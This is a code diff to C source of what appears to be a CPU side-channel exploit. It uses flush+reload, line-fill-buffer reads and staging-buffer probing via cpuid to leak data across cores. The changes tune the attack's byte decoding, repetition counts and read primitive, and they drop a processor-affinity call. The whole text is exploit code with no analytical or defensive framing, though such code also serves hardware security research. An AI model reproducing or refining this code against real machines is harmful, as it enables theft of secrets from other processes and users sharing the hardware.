@@ -85,7 +85,7 @@ uint8_t* allocate_flush_reload_buffer(){
     return mem;
 }
 
-void fill_result_buffer(char* buffer, int start, int end){
+void fill_result_buffer(char* buffer, int start, int end, int printable){
     for (int k = start; k < end; k++) {
         int max = 0, max_i = -1;
         for (int i = 1; i < 256; i++) {
@@ -95,7 +95,7 @@ void fill_result_buffer(char* buffer, int start, int end){
             }
         }
 
-        if (max > (float) REPS / READ_SUCCESS_THRESHOLD) {
+        if (!printable || max > (float) REPS / READ_SUCCESS_THRESHOLD) {
             buffer[k] = (char) max_i;
         } else {
             buffer[k] = '*';
@@ -114,7 +114,6 @@ void fill_result_buffer(char* buffer, int start, int end){
  * if a read was performed at a specific index or not
  */
 void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
-    set_processor_affinity(attacker_cpu1);
     memset(vector, 0, sizeof(vector[0]) * 64);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 256 * 64);
     int reps = _reps;
@@ -128,8 +127,8 @@ void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fil
             vector_hits[i][value & 0xFF]++;
         }
     }
-    if(fill_complete_buffer) fill_result_buffer(buffer, 0, 64);
-    else fill_result_buffer(buffer, start, end);
+    if(fill_complete_buffer) fill_result_buffer(buffer, 0, 64, 1);
+    else fill_result_buffer(buffer, start, end, 0);
 }
 
 /**
@@ -156,8 +155,8 @@ uint8_t prime_and_get_cpuid(uint32_t leaf){
  */
 int staging_buffer_byte_changed(void* mem, int pos, uint8_t reference){
     int success = 0;
-    for(int i = 0; i < REPS*3; i++){
-        success += lfb_read_basic(mem, pos) == reference;
+    for(int i = 0; i < REPS*2; i++){
+        success += lfb_read_offset(mem, pos) == reference;
     }
     return success == 0;
 }
